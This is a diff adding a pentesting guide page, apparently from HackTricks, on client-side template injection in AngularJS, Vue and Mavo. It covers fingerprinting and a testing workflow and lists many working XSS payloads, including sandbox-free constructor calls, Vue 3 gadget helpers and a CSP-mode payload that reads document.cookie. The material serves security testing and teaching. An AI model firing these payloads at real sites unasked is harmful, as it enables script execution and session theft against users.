@@ -1,0 +1,156 @@
+# Client Side Template Injection (CSTI)
+
+{{#include ../banners/hacktricks-training.md}}
+
+## Summary
+
+It is like a [**Server Side Template Injection**](ssti-server-side-template-injection/index.html) but in the **client**. The **SSTI** can allow you to **execute code** on the remote server, the **CSTI** could allow you to **execute arbitrary JavaScript** code in the victim's browser.
+
+**Testing** for this vulnerability is very **similar** as in the case of **SSTI**, the interpreter expects **a template** and will execute it. For example, with a payload like `{{ 7-7 }}`, if the app is **vulnerable** you will see a `0`, and if not, you will see the original: `{{ 7-7 }}`
+
+Not every HTML injection into a frontend framework is automatically exploitable as CSTI. The important question is whether the framework will **compile/evaluate attacker-controlled template syntax** or whether you only reached a plain HTML sink. In practice, first confirm the framework, then confirm the **exact sink**.
+
+## Discovery / Fingerprinting
+
+Before trying framework-specific payloads, confirm that your reflection lands inside a part of the DOM that is actually processed by the framework:
+
+- **AngularJS**: look for `ng-app`, `ng-controller`, `ng-bind`, `ng-bind-html`, or a global `window.angular`
+- **Vue**: look for `v-` directives, Vue-controlled DOM roots, or Vue globals/devtools markers
+- **Alpine.js**: look for `x-data`, `x-html`, `x-on`, etc. Even if the target is not directly exploitable via `{{...}}`, these markers tell you that client-side expression evaluation exists nearby
+
+Quick workflow:
+
+1. Confirm reflection with a unique marker
+2. Probe with a simple expression such as `{{7*7}}`
+3. If the expression is evaluated, switch to framework-specific RCE/XSS payloads
+4. If `{{...}}` is not evaluated, look for **directive/event sinks** (`ng-focus`, `v-html`, inline bindings, alternate delimiters, or dynamic template compilation)
+
+OWASP's current WSTG recommends identifying the framework first and then checking whether your reflection is re-parsed as a template rather than only inserted as inert text/HTML.<sup>[[1]](#references)</sup>
+
+## AngularJS
+
+AngularJS is a widely-used JavaScript framework that interacts with HTML through attributes known as directives, a notable one being **`ng-app`**. This directive allows AngularJS to process the HTML content, enabling the execution of JavaScript expressions inside double curly braces.
+
+In scenarios where user input is dynamically inserted into the HTML body tagged with `ng-app`, it's possible to execute arbitrary JavaScript code. This can be achieved by leveraging the syntax of AngularJS within the input. Below are examples demonstrating how JavaScript code can be executed:
+
+```javascript
+{{$on.constructor('alert(1)')()}}
+{{constructor.constructor('alert(1)')()}}
+<input ng-focus=$event.view.alert('XSS')>
+
+<!-- Google Research - AngularJS -->
+<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>
+```
+
+You can find a very **basic online example** of the vulnerability in **AngularJS** in [http://jsfiddle.net/2zs2yv7o/](http://jsfiddle.net/2zs2yv7o/) and in [**Burp Suite Academy**](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression)
+
+> [!CAUTION]
+> [**Angular 1.6 removed the sandbox**](http://blog.angularjs.org/2016/09/angular-16-expression-sandbox-removal.html) so from this version a payload like `{{constructor.constructor('alert(1)')()}}` or `<input ng-focus=$event.view.alert('XSS')>` should work.
+
+### Version-aware exploitation
+
+- **AngularJS < 1.6**: exploitation often requires a **sandbox escape**. Simple arithmetic probes such as `{{1+1}}` still help to confirm CSTI, but code-exec payloads are usually more version-specific.
+- **AngularJS >= 1.6**: the expression sandbox was removed, so direct `constructor.constructor(...)` style payloads become far more reliable when the reflection is compiled as an Angular expression.
+- **`ng-csp` / CSP mode**: AngularJS still exposes useful event objects and filters. PortSwigger's CSTI labs and research show that `orderBy` plus an event path can still turn a constrained expression into code execution:
+
+```html
+<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
+```
+
+If the application reflects your input into an **existing AngularJS directive** instead of plain HTML text, prioritize directive-based payloads such as `ng-focus`, `ng-click`, and filter abuse over raw mustache payloads.
+
+## VueJS
+
+You can find a **vulnerable Vue** implementation in [https://vue-client-side-template-injection-example.azu.now.sh/](https://vue-client-side-template-injection-example.azu.now.sh)\
+Working payload: [`https://vue-client-side-template-injection-example.azu.now.sh/?name=%7B%7Bthis.constructor.constructor(%27alert(%22foo%22)%27)()%7D%`](<https://vue-client-side-template-injection-example.azu.now.sh/?name=%7B%7Bthis.constructor.constructor(%27alert(%22foo%22)%27)()%7D%7D>)
+
+And the **source code** of the vulnerable example here: [https://github.com/azu/vue-client-side-template-injection-example](https://github.com/azu/vue-client-side-template-injection-example)
+
+```html
+<!-- Google Research - Vue.js-->
+"><div v-html="''.constructor.constructor('d=document;d.location.hash.match(\'x1\') ? `` : d.location=`//localhost/mH`')()"> aaa</div>
+```
+
+A really good post on CSTI in VUE can be found in [https://portswigger.net/research/evading-defences-using-vuejs-script-gadgets](https://portswigger.net/research/evading-defences-using-vuejs-script-gadgets)<sup>[[2]](#references)</sup>
+
+In modern Vue targets, distinguish between these two cases:
+
+- **Attacker-controlled template compilation**: the application uses a build that includes the **template compiler** and feeds user-controlled strings into Vue templates
+- **Dangerous HTML / gadget sinks**: the reflection lands in places such as `v-html`, dynamic bindings, or other gadgets that eventually reach JavaScript execution
+
+This distinction matters because the common **runtime-only** Vue builds do **not** compile arbitrary template strings on the client. A plain reflection into inert HTML is not enough by itself.
+
+### **V3**
+
+```
+{{_openBlock.constructor('alert(1)')()}}
+```
+
+Credit: [Gareth Heyes, Lewis Ardern & PwnFunction](https://portswigger.net/research/evading-defences-using-vuejs-script-gadgets)<sup>[[2]](#references)</sup>
+
+### **V2**
+
+```
+{{constructor.constructor('alert(1)')()}}
+```
+
+Credit: [Mario Heiderich](https://twitter.com/cure53berlin)
+
+Other useful Vue 3 gadget variants from PortSwigger research:
+
+```javascript
+{{_createBlock.constructor('alert(1)')()}}
+{{_toDisplayString.constructor('alert(1)')()}}
+{{_createVNode.constructor('alert(1)')()}}
+{{_Vue.h.constructor`alert(1)`()}}
+```
+
+The exact helper name exposed in the rendered template can vary depending on the Vue version / build output, so once you confirm Vue 3 CSTI, enumerate nearby helpers instead of assuming `_openBlock` is always present.<sup>[[2]](#references)</sup>
+
+**Check more VUE payloads in** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected)
+
+## Mavo
+
+Payload:
+
+```
+[7*7]
+[(1,alert)(1)]
+<div mv-expressions="{{ }}">{{top.alert(1)}}</div>
+[self.alert(1)]
+javascript:alert(1)%252f%252f..%252fcss-images
+[Omglol mod 1 mod self.alert (1) andlol]
+[''=''or self.alert(lol)]
+<a data-mv-if='1 or self.alert(1)'>test</a>
+<div data-mv-expressions="lolx lolx">lolxself.alert('lol')lolx</div>
+<a href=[javascript&':alert(1)']>test</a>
+[self.alert(1)mod1]
+```
+
+**More payloads in** [**https://portswigger.net/research/abusing-javascript-frameworks-to-bypass-xss-mitigations**](https://portswigger.net/research/abusing-javascript-frameworks-to-bypass-xss-mitigations)<sup>[[3]](#references)</sup>
+
+Mavo is still worth testing when you see `mv-` / `data-mv-` attributes because its expression parser allows **non-JavaScript syntax** that can bypass filters looking only for classic JS tokens. This is useful when `alert(1)`-style probes are filtered but Mavo expressions are still parsed.<sup>[[3]](#references)</sup>
+
+## Tooling
+
+If the target uses AngularJS heavily, [**ACSTIS / angularjs-csti-scanner**](https://github.com/tijme/angularjs-csti-scanner) can help with **crawling**, **version-aware payload selection**, and optional **payload verification** to reduce false positives.
+
+For manual testing, Burp's current Web Security Academy CSTI labs and XSS cheat sheet remain useful to quickly pivot from a basic `{{1+1}}` confirmation to framework-specific payloads.
+
+## **Brute-Force Detection List**
+
+
+{{#ref}}
+https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssti.txt
+{{#endref}}
+
+
+
+## References
+
+- [1] [OWASP WSTG - Testing for Client-side Template Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/15-Testing_for_Client-Side_Template_Injection)
+- [2] [PortSwigger Research - Evading defences using VueJS script gadgets](https://portswigger.net/research/evading-defences-using-vuejs-script-gadgets)
+- [3] [PortSwigger Research - Abusing JavaScript frameworks to bypass XSS mitigations](https://portswigger.net/research/abusing-javascript-frameworks-to-bypass-xss-mitigations)
+- [4] [AngularJS 1.6 expression sandbox removal](http://blog.angularjs.org/2016/09/angular-16-expression-sandbox-removal.html)
+
+{{#include ../banners/hacktricks-training.md}}
